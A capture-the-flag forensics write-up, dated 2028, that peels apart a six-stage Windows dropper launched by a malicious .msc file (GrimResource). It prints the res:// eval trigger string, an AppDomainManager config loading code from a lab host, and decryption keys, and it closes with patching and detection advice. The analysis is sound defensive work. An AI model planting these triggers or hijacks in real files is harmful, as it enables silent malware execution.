---
layout: post
title: "Binary Badresources"
date: 2028-03-03 09:00:00 -0500
categories: [HackTheBox, Challenges, Forensics]
tags: [hackthebox, challenge, forensics, grimresource, cve-2024-43572, msc, malware-analysis, deobfuscation, appdomainmanager, dfir]
description: "A single malicious .msc kicks off a six-stage dropper — obfuscated JavaScript, a Caesar-shifted VBScript, XOR'd stage files, an AppDomainManager hijack that loads a .NET shellcode loader, and an AES-encrypted URL to the final beacon. The whole chain peels apart statically."
---

## Overview

Binary Badresources is a Medium forensics challenge built around the **GrimResource** technique ([CVE-2024-43572](https://nvd.nist.gov/vuln/detail/CVE-2024-43572)): a malicious Microsoft Management Console file (`.msc`) that runs script the moment the console is opened. You're given only `wanted.msc`, and the flag lives at the end of a **six-stage** dropper chain — each stage encoded differently. The skill is recognising each layer and always driving to the next one.

## Stage 1 — GrimResource runs JavaScript

The MSC's string table contains:

```
res://apds.dll/redirect.html?target=javascript:eval(external.Document.ScopeNamespace.GetRoot().Name);
```

MMC loads `apds.dll`'s legacy `redirect.html`, whose unpatched [cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) flaw executes the `javascript:` URL — which `eval`s the **root scope node's `Name`**. So the real payload is the 18 KB `Name` string of the root `<Node>`, stored as a `<String>` element.

## Stage 2 — deobfuscate the JavaScript by capturing the sink

The payload is obfuscator.io-style JavaScript (a string array plus an index decoder) that concatenates hundreds of fragments and ends in `XML.transformNode(xsl)`. Rather than hand-decode it, run it in a sandbox and record whatever it feeds the sink — stub the host objects as recursive Proxies:

```js
const captured = [];
const mk = () => new Proxy(function(){ for (const a of arguments)
        if (typeof a === 'string' && a.length > 50) captured.push(a); return p; },
    { get: () => p, set: (t,k,v) => { if (typeof v==='string'&&v.length>50) captured.push(v); return true; },
      apply: (t,x,ar) => { for (const a of ar) if (typeof a==='string'&&a.length>50) captured.push(a); return p; } });
let p; global.external = mk(); global.ActiveXObject = () => mk();
eval(payload_js);              // the largest captured string is the transformNode() XSL
```

The captured 3.6 KB XSL contains an embedded `<ms:script language="VBScript">`.

## Stage 3 — the VBScript is Caesar-shifted

The VBScript rebuilds itself character by character with `chr(Asc(mid("Stxmsr$I|tpmgmx...",i,1)) - 4)` — a **Caesar cipher, shift −4** (`"Stxmsr$I|tpmgmx"` → `"Option Explicit"`, `$` → space):

```python
dec = "".join(chr((ord(c) - 4) % 256) for c in encoded)
```

The recovered dropper downloads `csrss.exe`, `csrss.dll`, `csrss.exe.config`, and `wanted.pdf` from `windowsupdate.htb`, then writes a PowerShell script that **XOR-decrypts** the files using `csrss.dll` as the key.

## Stage 4 — XOR-decrypt the stage files

The challenge docker serves those files (send a `Host: windowsupdate.htb` header). `csrss.dll` is the 32-byte XOR key:

```python
key = open("csrss.dll", "rb").read()
dec = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
```

`dec_csrss.exe` turns out to be a legitimate, signed Microsoft **`dfsvc.exe`** (ClickOnce) — a living-off-the-land binary. The interesting file is the decrypted `.config`.

## Stage 5 — AppDomainManager hijack

```xml
<appDomainManagerAssembly value="dfsvc, Version=0.0.0.0, ... PublicKeyToken=205fcab1ea048820" />
<codeBase href="http://windowsupdate.htb/5f8f9e33bb5e13848af2622b66b2308c.json"/>
```

When `dfsvc.exe` starts, .NET loads the attacker's `dfsvc` assembly from that `.json` URL. Download it — it's a **raw .NET DLL** (`MZ` header, not XOR'd).

## Stage 6 — decompile the loader, decrypt the shellcode URL

`ilspycmd` shows a `VirtualAlloc` + `CreateThread` **shellcode loader** whose `InitializeNewDomain` AES-decrypts a base64 blob into a URL, downloads the bytes, and runs them. From the static constructor:

- **AES-CBC**, zero padding
- **IV** = `UTF8("tbbliftalildywic")`
- **Key** = `SHA256(UTF8("vudzvuokmioomyialpkyydvgqdmdkdxy"))`

```python
iv  = b"tbbliftalildywic"
key = hashlib.sha256(b"vudzvuokmioomyialpkyydvgqdmdkdxy").digest()
url = AES.new(key, AES.MODE_CBC, iv).decrypt(base64.b64decode(blob)).rstrip(b"\0").decode()
# -> http://windowsupdate.htb/ec285935...xml  (the final shellcode)
```

The downloaded shellcode is a beacon, and the flag is a plaintext string inside it:

```
{"user":"HTB{...}"}   ...   /api/v1/homepage/%s
```

## Why it worked

GrimResource abuses a stale XSS reachable through the MSC's own string table, giving script execution the instant the console opens — no macro, no exploit binary. Everything after is defense-evasion layering: JS obfuscation, a Caesar VBScript, XOR'd files, an AppDomainManager hijack that turns a signed Microsoft binary into a loader, and AES to hide the C2 URL. The forensic win is peeling — identifying each encoding and always chasing the next stage rather than fixating on one blob.

## Fix / defense

- **Patch Windows** for [CVE-2024-43572](https://nvd.nist.gov/vuln/detail/CVE-2024-43572) — it stops MSC files from running unauthenticated script.
- Treat `.msc` as an executable attachment (block at the gateway). Alert on `apds.dll`/`res://` + `transformNode` inside MSC content, on `.config` files carrying `appDomainManagerAssembly` with a remote `codeBase`, and on `powershell -ExecutionPolicy Bypass` spawned from `mmc`/`dfsvc`.
